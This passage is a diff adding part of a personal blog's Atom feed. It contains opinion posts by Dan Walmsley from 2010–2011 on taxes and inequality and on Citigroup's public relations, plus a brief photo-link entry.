+&lt;p&gt;Taxes paid to the government largely go to “safety net” services like pensions, unemployment benefits, basic health care, food stamps and so on. Such services, in sufficient quantity and quality, enable unemployed or disabled people to retain their dignity and health while they get back on their feet and back to work. (source:Â &lt;a href=&quot;http://en.wikipedia.org/wiki/File:Fy2010_spending_by_category.jpg&quot; target=&quot;_blank&quot;&gt;See pie chart here&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;Very rich people are much less likely to need such services, and so for them paying taxes goes straight to something they don’t use and therefore don’t benefit from.&lt;/p&gt;
+
+&lt;p&gt;Do tax cuts really benefit the rich?&lt;/p&gt;
+&lt;ul&gt;
+	&lt;li&gt;&lt;a href=&quot;http://www.businessinsider.com/15-charts-about-wealth-and-inequality-in-america-2010-4#republican-tax-cuts-have-significantly-increased-the-wealth-gap-9&quot; target=&quot;_blank&quot;&gt;Huge leaps in inequality coinciding with tax cuts by Reagan and Bush Jr&lt;/a&gt; (note: Reagan also raised taxes, but in 1986 cut them)&lt;/li&gt;
+	&lt;li&gt;&lt;a href=&quot;http://www.businessinsider.com/15-charts-about-wealth-and-inequality-in-america-2010-4#the-last-two-decades-were-greatif-you-were-a-ceo-or-owner-not-if-you-were-anyone-else-5&quot; target=&quot;_blank&quot;&gt;Most of the benefits of economic growth going to the rich during the 90's &quot;boom&quot;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;But the rich in America, and in particular the super-rich, are a dwindling minority (while their total wealth balloons) (source: &lt;a href=&quot;http://www.businessinsider.com/15-charts-about-wealth-and-inequality-in-america-2010-4#the-gap-between-the-top-1-and-everyone-else-hasnt-been-this-bad-since-the-roaring-twenties-1&quot; target=&quot;_blank&quot;&gt;15 charts about wealth and poverty at Business Insider&lt;/a&gt;). Therefore in order to keep the system tilted in their favour they must convince a majority of voters to act in the interest of the wealthy elite, often against the poor’s own self-interest. They enact such influence on both Democrats and Republicans, but I can definitely detect a preference for Republicans, for whatever reason.&lt;/p&gt;
+
+&lt;p&gt;This is why we are seeing this daft resurgence of “small government” and “Reaganomics” mantras from the Tea Party, when a more relevant question would be “what is the right size for the government to meet our needs, and what mix of services would it provide?”.&lt;/p&gt;
+
+&lt;p&gt;This would be completely comprehensible (yet still not excusable), except that there’s a flaw the internal logic of these massive vested interests. As this siphoning of money and consolidation of power continues, the number of people who can afford to be at the top goes down. The social services that make life so easy for the rich crumble. You end up, in extreme cases, with scenes such as those scene across Africa and the Middle East this week (not that I’m suggesting the US is even close to that, but it’s an educational example nonetheless).&lt;/p&gt;
+
+&lt;p&gt;So how can the US-based super-rich act in their own self-interest without screwing over everyone else and, eventually, even themselves?&lt;/p&gt;
+
+&lt;p&gt;This brings me to a phenomenon I am going to call the “plumbing principle” (after actual plumbing, not Joe the Plumber). Basically the story goes like this: a version of the modern toilet was invented in England in the early 19th century because the aristocracy were so convinced that they were a fundamentally different breed of person from the lower classes that they started to pretend they didn’t even shit. In order to maintain this facade it was vitally important never to leave a room with a visible turd in it, be it in a pan, on the floor, on the nightstand or in the pocket of a silk smoking jacket.&lt;/p&gt;
+
+&lt;p&gt;This led to the popularisation of the ceramic flush toilet amongst the very rich. Hallelujah! A room and device that made your lordship’s turd disappear faster than a donut at a me-right-now convention.&lt;/p&gt;
+
+&lt;p&gt;But then something amazing happened. Doctors noticed a decrease in all sorts of diseases - naturally, as these people were exposed to far fewer microbes over a much shorter span of time.&lt;/p&gt;
+
+&lt;p&gt;In 1848, with the Thames boiling with effluent and full chamber pots causing as many head injuries as cases of Cholera, the British Parliament passed the Public Health Act, mandating a toilet in every home and allocating 5 million pounds (a huge sum at the time) for the construction of underground sewers and treatment plants.&lt;/p&gt;
+
+&lt;p&gt;In doing so, typhoid was practically eliminated overnight, and economic growth skyrocketed. The UK had achieved what so many civilisations had not - a functioning, multi-million person metropolis, with all the economic advantages and opportunities that created for both the nation and individuals.&lt;/p&gt;
+
+&lt;p&gt;Obama talks about the “Sputnik Moment” as the driver of innovation and passion for the current century, but this implies a winner and loser - at least internationally. With the US economy creaking at the seams and the rhetoric from vested interests getting ever more divisive, perhaps it’s actually time for a “plumbing moment” - for the super-rich, the government, and concerned citizens to take a step back and think very seriously about how we can reap the rewards of mutual success rather than the winner-takes-all situation we find ourselves in today.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/general/why-low-taxes-benefit-the-rich&quot;&gt;Why low taxes "benefit" the rich&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on February 22, 2011.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[The New Citigroup]]></title>
+  <link>/general/the-new-citigroup</link>
+  <id>/general/the-new-citigroup</id>
+  <published>2010-05-12T12:21:36-07:00</published>
+  <updated>2010-05-12T12:21:36-07:00</updated>
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;As part of its ongoing PR-ification of the financial crisis, Citigroup has posted the hilariously tautological “&lt;a href=&quot;http://new.citi.com/2010/02/a-safer-approach-to-risk.shtml&quot;&gt;A Safer Approach to Risk&lt;/a&gt;”.&lt;/p&gt;
+
+&lt;p&gt;Here’s a quote from the article:&lt;/p&gt;
+&lt;blockquote&gt;
+For our society to function efficiently, capital needs to flow. But the attendant risk must be better managed. That's why we've strengthened our commitment to responsible finance.
+&lt;/blockquote&gt;
+
+&lt;p&gt;And here’s another notable quote from recent history:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&quot;as long as the music is playing, you&amp;acirc;&amp;euro;&amp;trade;ve got to get up and dance. We&amp;acirc;&amp;euro;&amp;trade;re still dancing.&quot;
+    -Citi Chief on Buyouts: &amp;acirc;&amp;euro;&amp;tilde;We&amp;acirc;&amp;euro;&amp;trade;re Still Dancing&amp;acirc;&amp;euro;&amp;trade;, DealBook, July 2007
+&lt;/blockquote&gt;
+
+&lt;p&gt;Exactly how much of that culture has actually changed? You can revamp how you do business, but it’s not just Citi that’s broken. It’s the entire culture and machinery of top-tier capitalism. They may be chagrined, but that is only temporary.&lt;/p&gt;
+
+&lt;p&gt;Profit through obfuscation. Profit through leveraging the power that money provides. Profit through PR.&lt;/p&gt;
+
+&lt;p&gt;Why not profit through generating value? How about that for a change? Sheesh. I’m sick of financial companies that treat business like a giant card trick.&lt;/p&gt;
+
+&lt;p&gt;In other words, I remain to be convinced…&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/general/the-new-citigroup&quot;&gt;The New Citigroup&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on May 12, 2010.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[This ride isn't fun any more]]></title>
+  <link>/general/this-ride-isnt-fun-any-more</link>
+  <id>/general/this-ride-isnt-fun-any-more</id>
+  <published>2010-05-10T23:59:23-07:00</published>
+  <updated>2010-05-10T23:59:23-07:00</updated>
+  <author>
+    <name>Dan Walmsley</name>
+    <uri></uri>
+    <email>goldsounds@gmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;From an &lt;a href=&quot;http://riotclitshave.livejournal.com/1739481.html&quot;&gt;amazing photo blog&lt;/a&gt; I just discovered.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/wp-content/uploads/2010/05/tumblr_kx158yk2781qzj6xlo1_500.jpg&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2010/05/tumblr_kx158yk2781qzj6xlo1_500.jpg&quot; alt=&quot;&quot; title=&quot;tumblr_kx158yk2781qzj6xlo1_500&quot; width=&quot;495&quot; height=&quot;495&quot; class=&quot;aligncenter size-full wp-image-443&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;/general/this-ride-isnt-fun-any-more&quot;&gt;This ride isn't fun any more&lt;/a&gt; was originally published by Dan Walmsley at &lt;a href=&quot;&quot;&gt;GoldSounds&lt;/a&gt; on May 10, 2010.&lt;/p&gt;</content>
+</entry>
+
+</feed>
